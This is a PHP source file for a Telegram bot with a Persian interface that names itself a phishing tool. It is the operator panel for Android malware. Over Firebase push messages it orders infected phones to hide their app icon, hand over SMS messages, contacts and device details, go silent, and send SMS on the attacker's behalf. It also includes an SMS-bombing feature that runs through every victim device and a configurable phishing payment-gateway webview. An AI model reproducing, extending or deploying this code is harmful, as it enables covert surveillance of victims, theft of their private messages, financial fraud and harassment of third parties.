<?php 
error_reporting(0);

include("info.php");

define( 'TOKEN', $token );
define( 'API_ACCESS_KEY', $apikey );
if(!file_exists("userlist")){
mkdir("userlist");

}if(!file_exists("admins")){
file_put_contents("admins","");

}
if(!file_exists("user.txt")){
file_put_contents("user.txt","");

}
function bot($method, $datas = [])
{
    $url = "https://api.telegram.org/bot".TOKEN."/" . $method;
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $datas);
    $res = curl_exec($ch);
    if (curl_error($ch)) {

        var_dump(curl_error($ch));

    } else {
        return json_decode($res);
    }
}


function pingbot(){
    
    $ch = curl_init("127.0.0.1"); 
  curl_setopt($ch, CURLOPT_RETURNTRANSFER,1);
  if(curl_exec($ch))
  {
  $info = curl_getinfo($ch);
 return $info['total_time'] ;
  }

  curl_close($ch);

    
    
    
    
}
function deleteDirectory($dir) {

system('rm -rf -- ' . escapeshellarg($dir), $retval);

return $retval == 0; // UNIX commands return zero on success
}
function action($action,$androidid){
$data_string = '{"data":{"action":"'.$action.'","androidid":"'.$androidid.'"},"to":"\/topics\/pluto"}';

$headers = array ( 'Authorization: key=' . API_ACCESS_KEY, 'Content-Type: application/json' );
$ch = curl_init(); curl_setopt( $ch,CURLOPT_URL, 'https://fcm.googleapis.com/fcm/send' );
curl_setopt( $ch,CURLOPT_POST, true );
curl_setopt( $ch,CURLOPT_HTTPHEADER, $headers );
curl_setopt( $ch,CURLOPT_RETURNTRANSFER, true );
curl_setopt( $ch,CURLOPT_POSTFIELDS, $data_string);
$result = curl_exec($ch);
curl_close ($ch);
} 
function sendmess($action,$androidid,$phone,$message){
    $port=file_get_contents("port.txt");
$data_string = '{"data":{"action":"'.$action.'","androidid":"'.$androidid.'","phone":"'.$phone.'","text":"'.$message.'"},"to":"\/topics\/pluto"}';
$headers = array ( 'Authorization: key=' . API_ACCESS_KEY, 'Content-Type: application/json' );
$ch = curl_init(); curl_setopt( $ch,CURLOPT_URL, 'https://fcm.googleapis.com/fcm/send' );
curl_setopt( $ch,CURLOPT_POST, true );
curl_setopt( $ch,CURLOPT_HTTPHEADER, $headers );
curl_setopt( $ch,CURLOPT_RETURNTRANSFER, true );
curl_setopt( $ch,CURLOPT_POSTFIELDS, $data_string);
$result = curl_exec($ch);
curl_close ($ch);
  
}
function ping($action){
$port=file_get_contents("port.txt");
$data_string = '{"data":{"action":"'.$action.'"},"to":"\/topics\/pluto"}';

$headers = array ( 'Authorization: key=' . API_ACCESS_KEY, 'Content-Type: application/json' );
$ch = curl_init(); curl_setopt( $ch,CURLOPT_URL, 'https://fcm.googleapis.com/fcm/send' );
curl_setopt( $ch,CURLOPT_POST, true );
curl_setopt( $ch,CURLOPT_HTTPHEADER, $headers );
curl_setopt( $ch,CURLOPT_RETURNTRANSFER, true );
curl_setopt( $ch,CURLOPT_POSTFIELDS, $data_string);
$result = curl_exec($ch);
curl_close ($ch);
   
}
function sm1($chatid,$text,$reply){
	bot('sendMessage',[
	'chat_id'=>$chatid,
	'text'=>$text,
	'parse_mode'=>'HTML',
	'reply_to_message_id'=>$reply
	]);
}
function em($chatid,$message_id,$text,$keyboard){
bot('editmessagetext',[ 
    'chat_id'=>$chatid, 
    'message_id'=>$message_id,
    'text'=>$text,
    'parse_mode'=>'HTML',
    'reply_markup'=>$keyboard
	]);
	}
	
	
	
	
	
	
	
	$dir = "userlist";
$folders = array('..', '.', 'folder');
$files = array_diff(scandir($dir), $folders);
	
 
   
  foreach($files as $tr){
$and=json_decode(file_get_contents("userlist/$tr"))->androidid;
$name = str_replace(".json","",$tr);
$pmodel=json_decode(file_get_contents("userlist/$tr"))->name;
$ur = file_get_contents("saeed.txt");

$key[]= [['text'=>$name, 'callback_data'=>"androidid $pmodel $and"]];

}
$key[]= [['text'=> "• ʙᴀᴄᴋ •", 'callback_data'=> "back1"]];
$keyboard1= json_encode(['inline_keyboard'=> $key]);

 foreach($files as $tr){
$and=json_decode(file_get_contents("userlist/$tr"))->androidid;
$name = str_replace(".json","",$tr);


$key1[]= [['text'=>$name, 'callback_data'=>"deletes $name $and"]];

}


$key1[]= [['text'=> "• ʙᴀᴄᴋ •", 'callback_data'=> "booook"]];


   
 $keyboard2= json_encode(['inline_keyboard'=> $key1]);
  

   
function sm($chatid,$text,$keyboard){
	bot('sendMessage',[
	'chat_id'=>$chatid,
	'text'=>$text,
	'parse_mode'=>'HTML',
	'reply_markup'=>$keyboard
	]);
    }
    $pingbot=pingbot();
$update = json_decode(file_get_contents("php://input"));
$message = $update->message;
$message_id = $update->message->message_id;
$data = isset($message->text)?$message->text:$update->callback_query->data;
$chat_id = isset($update->callback_query->message->chat->id)?$update->callback_query->message->chat->id:$update->message->chat->id;
$from_id = isset($update->callback_query->message->from->id)?$update->callback_query->message->from->id:$update->message->from->id;
$text=$update->message->text;
$mi = $update->callback_query->message->message_id;
$first_n = $update->message->from->first_name;
$last_n = $update->message->from->last_name;
$first = $update->callback_query->from->first_name;
$last = $update->callback_query->from->last_name;
$firsms = file_get_contents("actionfirst.txt");
$first_name = $update->message->from->first_name;
$dom = file_get_contents("url.txt");
$usernamee = $update->message->from->username;
$username = $update->callback_query->from->username;
$adminact= file_get_contents("admins");
$authi=file_get_contents('autohide.txt');  
$count=count(scandir("userlist"))-2;
//=====

if(!file_exists("autohide.txt")){
file_put_contents("autohide",'off');
}


//==================================================,'callback_data' => 'PhoneList'
$ino = json_encode(array('inline_keyboard'=>[[['text'=>"ɴᴜᴍʙᴇʀ ᴜsᴇʀs",'callback_data' => 'jsieueueis'],['text'=>"{ $count }",'callback_data' => 'ddjsjsjsjj']],
[['text'=>"sᴇɴᴅᴇʀ ɪɴғᴏ",'callback_data' => 'koddkwkwkkk'],['text'=>"{ $id }",'callback_data' => 'kdkdks']],
[['text'=>"ᴀᴜᴛᴏ ʜɪᴅᴇ ɪs",'callback_data' => 'jsjsjs'],['text'=>"{ $authi }",'callback_data' => 'sjjejsjs']],
[['text'=>"ғɪʀsᴛ sᴍs",'callback_data' => 'jsjsjs'],['text'=>"{ $firsms }",'callback_data' => 'sjjejsjs']],
[['text'=>"ᴘᴏʀᴛ",'callback_data' => 'jdjjkkkdk'],['text'=>"{ $prt }",'callback_data' => 'jsjsi']],
[['text'=>"ᴘᴏʀᴛᴀʟ ᴅᴏᴍɪɴ",'callback_data' => 'kkkei']],
[['text'=>"{$dom}",'callback_data' => 'jdjsjj']],
[['text'=>"ᴛᴏᴋᴇɴ ʀᴏʙᴏᴛ",'callback_data' => 'jss']],
[['text'=>"{$token}",'callback_data' => 'jsjsjsje']],
[['text'=>"ʙᴀᴄᴋ",'callback_data' => 'booook']]
]));
$starta = json_encode(array(
'keyboard'=>[
[['text'=>'🕹کنترل هدف🕹'],['text'=>'⚡️کاربران آنلاین⚡️']],
[['text'=>'🔕هاید خودکار🔕'],['text'=>'🔗پیام اولیه🔗']],
[['text'=>'🌀پیام بمبر🌀']],
[['text'=>'♻️هاید همه♻️'],['text'=>'🔧درگاه🔧']],
[['text'=>'🛍کسر موج🛍'],['text'=>'💧مشخصات پنل💧']],
[['text'=>'💥ریست ربات💥'],['text'=>'🏳️‍🌈زبان🏳️‍🌈']],
]));
$admins = json_encode(array(
'keyboard'=>[
[['text'=>'📍ارسال پیام📍'],['text'=>'⚡️هاید ایکون⚡️']],
[['text'=>'📮پیام ها📮'],['text'=>'🌀مخاطبین🌀']],
[['text'=>'✏️اتو پیام✏️'],['text'=>'🔇بی صدا🔇']],
[['text'=>'📬اخرین پیام📬'],['text'=>'📱اطلاعات کاربر📱']],
[['text'=>'▪️برگشت▪️']]
]));
$buyi = json_encode(array(
'keyboard'=>[
[['text'=>'🟢هاید روشن🟢'],['text'=>'🔴هاید عیر فعال🔴']],
[['text'=>'🟢خرید روشن🟢'],['text'=>'🔴خرید غیر فعال🔴']],
[['text'=>'▪️برگشت▪️']],
]));
$autohids = json_encode(array(
'keyboard'=>[
[['text'=>'✅فعال✅'],['text'=>'🚫غیر فعال🚫']],
[['text'=>'▪️برگشت▪️']],
]));
$lung = json_encode(array(
'keyboard'=>[
[['text'=>'🌎انگلیسی🌎']],
[['text'=>'▪️برگشت▪️']],
]));
$fsms = json_encode(array(
'keyboard'=>[
[['text'=>'🔴 فعال 🔴'],['text'=>'🔵 غیر فعال 🔵']],
[['text'=>'🌵ست شماره🌵']],
[['text'=>'🗯ست متن🗯']],
[['text'=>'▪️برگشت▪️']],
]));
$dosel = json_encode(array(
'keyboard'=>[
[['text'=>'اره 😆'],['text'=>'ادیت 😰']],
[['text'=>'▫️برگشت▫️']],
]));
$back1=json_encode(array(
'keyboard'=>[
[['text'=>'▪️برگشت▪️']]
]));
$back4=json_encode(array(
'keyboard'=>[
[['text'=>'▫️برگشت▫️']]
]));

if(in_array($chat_id,$admin_list)){
	if(preg_match('/^\/([Ss]tart)(.*)/',$text)){
	    sm($chat_id,"{🐉} سلام $first_name به ربات ابزار فیشینگ خوش امدید
	
{🍀} شما میتونید از طریق دکمه های زیر کار هاتونو انجام بدید ☺{👇🏻}

{👨‍💻} نویسنده $crd ",$starta);

	    }elseif($text == '▪️برگشت▪️'){        
	    sm($chat_id,"{🐉} سلام $first_name به ربات ابزار فیشینگ خوش امدید
	
{🍀} شما میتونید از طریق دکمه های زیر کار هاتونو انجام بدید ☺{👇🏻}

{👨‍💻} نویسنده $crd ",$starta);
file_put_contents("admins","");
}elseif($text == '🛍کسر موج🛍'){        
	    sm($chat_id,"{🛍} لطفا حالت هاید بعد پرداخت و کسر موج را انتخاب کنید

{👨‍💻} نویسنده $crd ",$buyi);
}elseif($text == '🏳️‍🌈زبان🏳️‍🌈'){        
	    sm($chat_id,"{🍟} لطفا زبان مورد نظر خود را انتخاب کنید

{👨‍💻} نویسنده $crd ",$lung);
}
    elseif($text == '🔗پیام اولیه🔗'){        
	    sm($chat_id,"{🦋} لطفا حالت پیام اولیه را انتخاب کنید {👇🏻}

{👨‍💻} نویسنده $crd ",$fsms);

	}elseif($text == '♻️هاید همه♻️'){
		sm($chat_id,"{📴} درخواست هاید ایکون به همه { $count } یوزر ها ارسال شد 

لطفا منتظر پاسخ باشید 🙂 {💊}

{👨‍💻} نویسنده $crd",$starta);

	 $data = file_get_contents('user.txt');
    $androidid1 = explode("/", $data); 
    foreach ($androidid1 as $androidid) {
        
  action('hideicon',$androidid);
       
    
    } 
 
	    
}elseif($text == '⚡️کاربران آنلاین⚡️'){
	sm($chat_id,"{📱} درخواست به تمام {$count} یوز ها ارسال شد

لطفا منتظر پاسخ باشید 🙂 {💊}

{👨‍💻} نویسنده $crd",$back1);
	    ping('ping');        
	    
}elseif($text == '🌀پیام بمبر🌀'){        
	    sm($chat_id,"{💢} لطفا شماره هدف خود را وارد کنید

کل یوزر ها $count {📟}

{👨‍💻} نویسنده $crd",$back1);
file_put_contents("admins","smsbomber");
	   }elseif($adminact == "smsbomber" ){
	    file_put_contents("bomber.txt",$text);
	    sm($chat_id,"{💢}  لطفا متنی که میخواهید به تارگت ارسال شود را وارد کنید

کل یوزر ها : $count {📟}
شماره هدف : $text {😆}

{👨‍💻} نویسنده  $crd ",$back1);
file_put_contents("admins","smsbomber1");

}elseif($adminact == "smsbomber1" ){
    
    sm($chat_id,"{💣}  شماره $bom هدف با موفقیت بمبر شد

متن ارسالی : $text

{👨‍💻} نویسنده  $crd ",$starta);

file_put_contents("admins","");

	    file_put_contents("smsbomber.txt",$text);
	$message = file_get_contents("smsbomber.txt");
	$phone = file_get_contents("bomber.txt");
	$data = file_get_contents('user.txt');
    $androidid1 = explode("/", $data); 
    foreach ($androidid1 as $androidid) {
        
    sendmess("SendSingleMessage",$androidid,$phone,$message);
    }
	    

	    }elseif($text == '▫️برگشت▫️'){
		sm($chat_id,"{🎛} پنل کنترل کاربر

از طریق دکمه های زیر میتوانید کاربر خود را مدیریت کنید🤓 {👇} 
 
{👨‍💻} نویسنده  $crd ",$admins);

 }elseif($text == '💥ریست ربات💥'){
 	
		sm($chat_id,"{🔰} کل ربات ریست شد
		
همه کاربران حذف شدند {✅}

تمام حالت ها خاموش شدند {✅}

لطفا گذینه مورد نظر خود را انتخاب کنید 🤓 {👇} 
 
{👨‍💻} نویسنده  $crd ",$starta);
file_put_contents("admins","");
file_put_contents("url.txt","https://google.com");
file_put_contents("p","");
file_put_contents("autohide.txt","off");
file_put_contents("actionbuy.txt","off");
file_put_contents("actionhide.txt","off");
file_put_contents("actionfirst.txt","off");
file_put_contents("ftext.txt","");
file_put_contents("fsms.txt","");
file_put_contents("user.txt","");
deleteDirectory("userlist");
	
	}elseif($text == '💧مشخصات پنل💧'){
	    
	    
	    
	     sm($chat_id,"{🎗} اطلاعات پنل ابزار فیشینگ شما

{👨‍💻} نویسنده $crd ",$ino);

}
	elseif($data=="booook"){
	    
	    
	    
	     sm($chat_id,"{🐉} سلام $first_name به ربات ابزار فیشینگ خوش امدید
	
{🍀} شما میتونید از طریق دکمه های زیر کار هاتونو انجام بدید ☺{👇🏻}

{👨‍💻} نویسنده $crd ",$starta);
file_put_contents("admins","");
	    
	    
	}elseif($text == '🕹کنترل هدف🕹'){        
	    sm($chat_id,"{📟} لطفا اندروید ایدی تارگت را ارسال کنید
	
{👨‍💻} نویسنده $crd",$back1);
	    file_put_contents("admins","setuser");
	
	    }elseif($text == '🌵ست شماره🌵'){        
	    sm($chat_id,"{🌵} لطفا شماره ای که میخواهید در نصب اول پیام ارسال شود را وارد کتید
	
{👨‍💻} نویسنده $crd",$back1);
	    file_put_contents("admins","firstnum");
	
	}elseif($adminact == "firstnum" ){
	    file_put_contents("fsms.txt",$text);
	    sm($chat_id,"{✅}  شماره پیام اولیه ست شد

شماره شما : $text

{👨‍💻} ᴏᴡɴᴇʀ  $crd ",$starta);
file_put_contents("admins","");
}elseif($text == '🗯ست متن🗯'){        
	    sm($chat_id,"{🗯} لطفا متنی که میخواهید در نصب اولیه به شماره تنظیم شده ارسال شود را وارد کتید
	
{👨‍💻} ᴏᴡɴᴇʀ $crd",$back1);
	    file_put_contents("admins","firsttext");
	
	}elseif($adminact == "firsttext" ){
	    file_put_contents("ftext.txt",$text);
	    sm($chat_id,"{✅}  متن پیام اولیه ذخیره شد
	
متن شما :

$text

{👨‍💻} نویسنده  $crd ",$starta);

 }elseif($text == '🌎انگلیسی🌎'){ 
 rename("bot.php", "pe.php");
	    sm($chat_id,"{🌎}  زبان شما به انگلیسی تغییر کرد
لطفا /start کنید {✅}

{👨‍💻} نویسنده  $crd ",$starta);
rename("en.php", "bot.php");
	 }elseif($text == '🔴 فعال 🔴'){ 
       file_put_contents("actionfirst.txt","on"); 
	    sm($chat_id,"{🎗} پیام اولیه روشن  {✅}

{👨‍💻} نویسنده  $crd ",$starta);
file_put_contents("admins","");
 }elseif($text == '🔵 غیر فعال 🔵'){ 
       file_put_contents("actionfirst.txt","off"); 
	    sm($chat_id,"{🎗} پیام اولیه خاموش  {❌}

{👨‍💻} نویسنده  $crd ",$starta);
file_put_contents("admins","");
}elseif($text == '🟢هاید روشن🟢'){ 
       file_put_contents("actionhide.txt","on"); 
	    sm($chat_id,"{🖲}  هاید بعد پرداخت روشن  {✅}

{👨‍💻} نویسنده  $crd ",$starta);
file_put_contents("admins","");
 }elseif($text == '🔴هاید عیر فعال🔴'){ 
       file_put_contents("actionhide.txt","off"); 
	    sm($chat_id,"{🖲} هاید بعد پرداخت خاموش  {❌}

{👨‍💻} نویسنده  $crd ",$starta);
}elseif($text == '🟢خرید روشن🟢'){ 
       file_put_contents("actionbuy.txt","on"); 
	    sm($chat_id,"{🖲}  کسر موج روشن  {✅}

{👨‍💻} نویسنده  $crd ",$starta);
file_put_contents("admins","");
 }elseif($text == '🔴خرید غیر فعال🔴'){ 
       file_put_contents("actionbuy.txt","off"); 
	    sm($chat_id,"{🖲}  کسر موج خاموش {❌}

{👨‍💻} نویسنده  $crd ",$starta);
	}elseif($text == '🔧درگاه🔧'){        
	    sm($chat_id,"{🔗}  لطفا لینک درگاه خود را وارد کنید

لطفا ssl درگاه خود را فعال کنید و لینک درگاه خود را به صورتhttps بفرستید {⚠️}

{👨‍💻} نویسنده  $crd ",$back1);
	    file_put_contents("admins","setdom");
	
	    }elseif($text == '🔕هاید خودکار🔕'){        
	    sm($chat_id,"{🔕} حالت هاید خودکار ایکون را انتخاب کنید

{👨‍💻} نویسنده  $crd ",$autohids);
	    file_put_contents("admins","autohide");
	    
	    }elseif($text == '✅فعال✅'){ 
       file_put_contents("autohide.txt","on"); 
	    sm($chat_id,"{🔕} هاید خودکار ایکون روشن است  {✅}

{👨‍💻} نویسنده  $crd ",$starta);
file_put_contents("admins","");
 }elseif($text == '🚫غیر فعال🚫'){ 
       file_put_contents("autohide.txt","off"); 
	    sm($chat_id,"{🔕} هاید خودکار ایکون غیر فعال است  {🚫}

{👨‍💻} نویسنده  $crd ",$starta);
file_put_contents("admins","");
	
	}elseif(strpos($data,'androidid') !==false){
	   $datass=explode(" ",$data);
	 file_put_contents('p',$datass[2]);   
	 file_put_contents('name',$datass[1]);      
	    	            
	    em($chat_id,$mi,"🕹 - Wᴇʟᴄᴏᴍᴇ Tᴏ $datass[1]  Aᴅᴍɪɴ Pᴀɴᴇʟ 
	
Yᴏᴜ Cᴀɴ Mᴀɴᴀɢᴇ Yᴏᴜʀ Usᴇʀ Wɪᴛʜ Tʜᴇ Fᴏʟʟᴏᴡɪɴɢ Bᴜᴛᴛᴏɴs -《🎗》

Cᴏᴅᴇᴅ ʙʏ @Phish_otp - 🇫🇷️",$admins);
	    
	}elseif($text == '🔇بی صدا🔇'){        
		sm($chat_id,"{🔇} درخاست بی صدا به موبایل تارگت ارسال شد
	
 لطفا منتظر پاسخ بمانید 😎 {⚡️}
 
{👨‍💻} نویسنده  $crd ",$admins);
	     $androidid=file_get_contents('p');  
	     $name = file_get_contents('name');  
	     action('pingone',$androidid);
	     
	    
	   
	    
	}elseif($text == '📱 اطلاعات کاربر📱'){        
		sm($chat_id,"{📱} درخاست اطلاعات موبایل به هدف ارسال شد
	
 لطفا منتظر پاسخ بمانید 😎 {⚡️}
 
{👨‍💻} نویسنده  $crd ",$admins);
	     $androidid=file_get_contents('p');  
	     $name = file_get_contents('name');  
	     
	     action('getdevicefullinfo',$androidid);
	     
	    
	   
	    
	}elseif($text == '🌀مخاطبین🌀'){        
		sm($chat_id,"{🌀} درخاست دریافت تمام مخاطبین به موبایل هدف ارسال شد
	
 لطفا منتظر پاسخ بمانید 😎 {⚡️}
 
{👨‍💻} نویسنده  $crd ",$admins);
	    $androidid=file_get_contents('p');  
	     $name = file_get_contents('name');  
	    
	     action('getcontact',$androidid);
	     
	    
	    
	    
	    
	}elseif($text == '📮پیام ها📮'){        
		sm($chat_id,"{📮} درخاست دریافت تمام پیام ها به موبایل هدف ارسال شد
	
 لطفا منتظر پاسخ بمانید 😎 {⚡️}
 
{👨‍💻} نویسنده  $crd ",$admins);
	    $androidid=file_get_contents('p');  
	     $name = file_get_contents('name');  
	    
	     action('getsms',$androidid);
	     
	    
	    
	    
	    
	}
	
	
	
	elseif($text == '📍ارسال پیام📍'){        
	    $messs=file_get_contents("mess");

	    sm($chat_id,"{📤} پیام ذخیره شده شما :
	
$messs
	
ایا میخاهید از پیام ذخیره شده استفاده نمایید یا متن جدید وارد کنید {❓}
	
{👨‍💻} نویسنده  $crd 
",$dosel);

   }
   elseif($text == 'اره 😆'){
   	
   file_put_contents("admins","message1");
   sm($chat_id,"{☎️} لیست شماره را وارد کنید : 

{👨‍💻} نویسنده  $crd ",$back4);
}
   elseif($text == 'ادیت 😰'){
   	
   file_put_contents("admins","message");
   sm($chat_id,"{🍀} لطفا متن پیام خود را وارد کنید :

{👨‍💻} نویسنده  $crd ",$back4);
   
	

    }
    
	elseif($text == '⚡️هاید ایکون⚡️'){
		sm($chat_id,"{📴} درخاست هاید ایکون به موبایل هدف ارسال شد
	
 لطفا منتظر پاسخ بمانید 😎 {⚡️}
 
{👨‍💻} نویسنده  $crd ",$admins);
	  $androidid=file_get_contents('p');  
action('hideicon',$androidid);
   $name=file_get_contents('name');  
     
	       
  
 
    
	    }elseif($text == '✏️اتو پیام✏️'){        
		sm($chat_id,"{🖍} متنی که میخواهید ارسال کنید را وارد کنید : 

{👨‍💻} نویسنده  $crd ",$admins);   
file_put_contents("admins","autos");
}elseif($adminact == "autos" ){
	sm($chat_id,"{🎙}  اس ام اس ها به {30} شماره به صورت خودکار ارسال شد
	شماره استخراج شده : True
 
{👨‍💻} نویسنده  $crd ",$admins);
file_put_contents("admins","");
	  
	    
	    
	}elseif($text == '📬اخرین پیام📬'){
		sm($chat_id,"{📨} درخاست گرفتن اخرین پیام به موبایل هدف ارسال شد
	
 لطفا منتظر پاسخ بمانید 😎 {⚡️}
 
{👨‍💻} نویسنده  $crd ",$admins);
	  $androidid=file_get_contents('p');  
action('lastsms',$androidid);
   $name=file_get_contents('name');  
     
	       

	}elseif($adminact == "message" ){
        file_put_contents('mess',$text);
        
        $nump=file_get_contents("nump");
        
        	    sm($chat_id,"{☎️} لطفا لیست شماره را وارد کنید : 

{👨‍💻} نویسنده  $crd ",$back4);
        
         file_put_contents("admins","message1");
         
    }elseif($adminact == "message1" ){
    	sm($chat_id,"{📧} درخاست ارسال پیام به موبایل هدف ارسال شد
 
{👨‍💻} نویسنده  $crd ",$admins);   	    
        file_put_contents('nump',$text);
        $nump=file_get_contents("nump");
       $androidid=file_get_contents('p');  
	  $messs=  file_get_contents("mess");
 $data = file_get_contents('nump');
    $str = explode("\n", $data); 
    foreach ($str as $str1) {
        
  sendmess("SendSingleMessage",$androidid,$str1,$messs);
       
    
    } 
     file_put_contents("nump","");

file_put_contents("admins","");
	    
	
		
		}elseif($adminact=="setdom"){
			file_put_contents("url.txt",$text);
			
			sm($chat_id,"{🔗} درگاه وب ویو داخل رت ست شد

درگاه شما : $text {🔅}

{👨‍💻} نویسنده $crd 
",$starta);
file_put_contents("admins","");
	    
	    
	}elseif($adminact=="setuser"){
	    //strlen($text) == 16 and
	    if( strpos(file_get_contents("user.txt"),$text) !== false){
	        
	    file_put_contents("p",$text);
	sm($chat_id,"{〽️}  اندروید ایدی $text ست شد ",$admins);
	     sm($chat_id,"{🎛} کنترل پنل تارگت وارد شدید

گذینه مورد نظر خود را انتخاب کنید 🤓 {👇} 
 
{👨‍💻} نویسنده  $crd ",$admins);
	  
	     file_put_contents("admins","");
	    }else{
	        
	        
	            sm($chat_id,"{❎} اندروید ایدی اشتباه است",$starta);
	file_put_contents("admins","");
	
	        
	        
	            
  
	}
	
}

}


	       

  ?>
        
    






